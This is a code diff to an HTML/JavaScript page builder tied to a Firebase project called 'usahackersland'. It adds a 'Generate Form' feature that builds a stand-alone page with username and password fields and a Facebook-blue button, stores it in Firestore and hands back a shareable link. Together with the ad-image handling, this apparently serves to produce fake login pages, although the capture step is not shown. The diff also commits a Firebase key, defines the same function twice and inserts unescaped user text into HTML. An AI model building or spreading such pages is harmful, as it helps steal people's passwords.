@@ -454,6 +454,21 @@
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
 
 <script>
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland",
+  storageBucket: "usahackersland.appspot.com"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+const db = firebase.firestore();
+window.db = db; // ✅ THIS FIXES YOUR ERROR
+</script>
+
+<script>
+
 // JavaScript to handle the custom image uploads
 document.addEventListener("DOMContentLoaded", function () {
   const fbAdImage = document.getElementById("fbAdImage");
@@ -1779,10 +1794,9 @@ document.addEventListener("DOMContentLoaded", function () {
 
 <!-- Generate Form -->
 <div class="section">
-  <button id="generateFormButton" onclick="generateForm()">Generate Form</button>
+  <button id="generateFormButton">Generate Form</button>
   <div id="linkArea" class="linkBox" style="display:none; margin-top:10px;"></div>
 </div>
-
 </div>
 
 <!-- PREVIEW -->
@@ -1800,6 +1814,289 @@ document.addEventListener("DOMContentLoaded", function () {
 const $ = id => document.getElementById(id);
 
 let ytApiReady = false;
+
+const fbAdImageInput = document.getElementById("fbAdImage");
+
+// ===============================
+// 🚀 INIT BUTTON
+// ===============================
+document.addEventListener("DOMContentLoaded", function () {
+
+  const generateBtn = document.getElementById("generateFormButton");
+
+  if (generateBtn) {
+    generateBtn.addEventListener("click", generateForm);
+  }
+
+});
+
+// ===============================
+// 🏗 1️⃣ GENERATE & SAVE FORM
+// ===============================
+async function generateForm() {
+
+  try {
+
+    // 🔐 Check Firebase
+    if (!window.firebase || !window.db) {
+      alert("Firebase not initialized.");
+      return;
+    }
+
+    // 🔢 Unique ID
+    const formId = "form_" + Date.now();
+
+    // 📝 Get Values
+    const pageTitle =
+      document.getElementById("title")?.value || "Generated Page";
+
+    const description =
+      document.getElementById("description")?.value || "";
+
+    const buttonText =
+      document.getElementById("buttonText")?.value || "Submit";
+
+    // 🏗 Build HTML
+    const formHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>${pageTitle}</title>
+<style>
+body {
+  font-family: Arial;
+  padding: 40px;
+  background: #f4f6f9;
+}
+.box {
+  max-width: 420px;
+  margin: auto;
+  background: #fff;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+input, button {
+  width: 100%;
+  padding: 10px;
+  margin-top: 10px;
+}
+button {
+  background: #1877f2;
+  color: #fff;
+  border: none;
+  cursor: pointer;
+}
+</style>
+</head>
+<body>
+<div class="box">
+  <h2>${pageTitle}</h2>
+  <p>${description}</p>
+  <input type="text" placeholder="Username">
+  <input type="password" placeholder="Password">
+  <button>${buttonText}</button>
+</div>
+</body>
+</html>
+`;
+
+    // 💾 Save to Firestore
+    await db.collection("forms").doc(formId).set({
+      id: formId,
+      html: formHTML,
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+
+    // Save globally
+    const previewContainer = document.getElementById("preview");
+
+if (!previewContainer) {
+  alert("Preview container not found.");
+  return;
+}
+
+const fullHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>${pageTitle}</title>
+<style>
+body { margin:0; font-family:Arial; }
+</style>
+</head>
+<body>
+${previewContainer.innerHTML}
+</body>
+</html>
+`;
+
+window.generatedHTML = fullHTML;
+    window.generatedFormId = formId;
+
+    // 🔗 Now generate link separately
+    generateShareLink(formId);
+
+  } catch (error) {
+    console.error("Generate Error:", error);
+    alert("Error: " + error.message);
+  }
+
+}
+
+
+// ===============================
+// 🔗 2️⃣ GENERATE SHARE LINK
+// ===============================
+function generateShareLink(formId) {
+
+  const link =
+    window.location.origin + "/form.html?id=" + formId;
+
+  const linkArea = document.getElementById("linkArea");
+
+  if (!linkArea) return;
+
+  linkArea.style.display = "block";
+
+  linkArea.innerHTML = `
+  <div style="
+    background:#e8f5e9;
+    padding:15px;
+    border-radius:6px;
+    border:1px solid #c8e6c9;
+  ">
+    <strong style="color:#2e7d32;">
+      ✅ Form Generated Successfully
+    </strong><br><br>
+
+    🔗 <a href="${link}" target="_blank">
+      ${link}
+    </a><br><br>
+
+    <button onclick="copyGeneratedLink('${link}')">
+      📋 Copy Link
+    </button>
+
+    <button onclick="downloadGeneratedHTML()">
+      ⬇ Download HTML
+    </button>
+
+    <button onclick="copyGeneratedHTML()">
+      📄 Copy HTML
+    </button>
+  </div>
+`;
+
+  linkArea.scrollIntoView({ behavior: "smooth" });
+
+}
+
+// ===============================
+// 🔥 BUILD FULL HTML FROM PREVIEW
+// ===============================
+function buildFullHTMLFromPreview() {
+
+  const previewContainer = document.getElementById("preview"); 
+  // ⚠️ CHANGE "preview" to your real preview ID
+
+  if (!previewContainer) {
+    alert("Preview container not found.");
+    return null;
+  }
+
+  const styles = `
+    <style>
+      body {
+        margin:0;
+        font-family: Arial, sans-serif;
+        background:#f4f6f9;
+      }
+      img {
+        max-width:100%;
+      }
+    </style>
+  `;
+
+  const fullHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Generated Form</title>
+${styles}
+</head>
+<body>
+${previewContainer.innerHTML}
+</body>
+</html>
+`;
+
+  return fullHTML;
+}
+
+// ===============================
+// 📋 3️⃣ COPY FUNCTION
+// ===============================
+function copyGeneratedLink(link) {
+
+  navigator.clipboard.writeText(link)
+    .then(() => alert("Link copied!"))
+    .catch(() => alert("Failed to copy."));
+
+}
+
+
+// ===============================
+// ⬇ 4️⃣ DOWNLOAD FUNCTION
+// ===============================
+function downloadGeneratedHTML() {
+
+  const fullHTML = buildFullHTMLFromPreview();
+
+  if (!fullHTML) return;
+
+  const blob = new Blob(
+    [fullHTML],
+    { type: "text/html" }
+  );
+
+  const url = URL.createObjectURL(blob);
+
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "generated-form.html";
+  document.body.appendChild(a);
+  a.click();
+
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+
+  alert("HTML downloaded successfully!");
+}
+
+// ===============================
+// 📄 COPY HTML
+// ===============================
+// ===============================
+// 📄 COPY FULL HTML (LIVE VERSION)
+// ===============================
+function copyGeneratedHTML() {
+
+  const fullHTML = buildFullHTMLFromPreview();
+
+  if (!fullHTML) return;
+
+  navigator.clipboard.writeText(fullHTML)
+    .then(() => {
+      alert("Full HTML copied successfully!");
+    })
+    .catch(() => {
+      alert("Failed to copy HTML.");
+    });
+}
 
 /* =====================================
    🔥 ULTRA EFFECT MASTER LIST
@@ -3697,23 +3994,56 @@ draggableItems.forEach(line => {
 }
 
 // -------------------------
-// Firebase
+// Generate Form System
 // -------------------------
-const firebaseConfig = {
-  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-  authDomain: "usahackersland.firebaseapp.com",
-  projectId: "usahackersland",
-  storageBucket: "usahackersland.appspot.com"
-};
 
-// Initialize Firebase
-firebase.initializeApp(firebaseConfig);
+// Button Click Listener
+document.getElementById("generateFormBtn")
+  ?.addEventListener("click", generateForm);
 
-// Firestore
-const db = firebase.firestore();
+// Main Function
+async function generateForm() {
 
-// Firebase Storage
-const storage = firebase.storage();
+  const titleInput = document.getElementById("formTitleInput");
+  const title = titleInput ? titleInput.value : "Untitled Form";
+
+  // Create unique ID
+  const formId = "form_" + Date.now();
+
+  // Collect your form fields here if needed
+  const formData = {
+    id: formId,
+    title: title,
+    createdAt: new Date()
+  };
+
+  try {
+
+    // Save to Firestore
+    await db.collection("forms").doc(formId).set(formData);
+
+    // Create Shareable Link
+    const link = `${window.location.origin}/form.html?id=${formId}`;
+
+    // Show link on page
+    const linkBox = document.getElementById("generatedLinkBox");
+
+    if (linkBox) {
+      linkBox.innerHTML = `
+        <p style="margin-top:10px;">
+          ✅ Form Generated Successfully<br>
+          <a href="${link}" target="_blank">${link}</a>
+        </p>
+      `;
+    } else {
+      alert("Form Generated!\n\n" + link);
+    }
+
+  } catch (error) {
+    console.error("Error generating form:", error);
+    alert("Error generating form. Check console.");
+  }
+}
 
 /* ==========================================
    UNIVERSAL IMAGE UPLOAD HANDLER
